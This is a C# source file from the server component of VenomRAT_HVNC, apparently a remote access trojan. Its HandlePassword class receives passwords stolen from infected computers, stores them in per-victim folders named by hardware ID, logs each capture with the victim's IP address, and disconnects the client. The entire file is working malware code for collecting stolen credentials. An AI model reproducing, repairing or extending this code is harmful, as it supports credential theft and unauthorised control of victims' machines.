using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    internal class HandlePassword
    {
        public void SavePassword(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string asString = unpack_msgpack.ForcePathObject("Password").GetAsString();
                string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\Password");
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                }
                File.WriteAllText(text + string.Format("\\Password_{0:MM-dd-yyyy HH;mm;ss}.txt", DateTime.Now), asString);
                new HandleLogs().Addmsg(string.Concat(new string[]
                {
                    "Client ",
                    client.Ip,
                    " password saved success, file located @ ClientsFolder/",
                    unpack_msgpack.ForcePathObject("Hwid").AsString,
                    "/Password"
                }), Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("Password saved error: " + ex.Message, Color.Red);
            }
        }
    }
}
